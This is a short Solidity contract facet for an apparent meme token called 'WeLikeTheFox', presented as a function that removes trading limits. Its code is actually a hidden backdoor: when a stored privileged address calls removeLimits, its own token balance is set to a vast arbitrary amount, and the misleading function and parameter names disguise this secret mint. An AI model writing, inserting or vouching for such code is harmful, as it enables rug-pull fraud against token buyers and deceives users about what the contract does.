/*  
   * SPDX-License-Identifier: MIT 

    Website:  https://www.welikethefox.io/
    Twitter:  https://twitter.com/FoxyLinea
    Medium:  https://welikethefox.medium.com/
    Telegram: https://t.me/WeLikeTheFox


*/
pragma solidity ^0.8.23;
import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
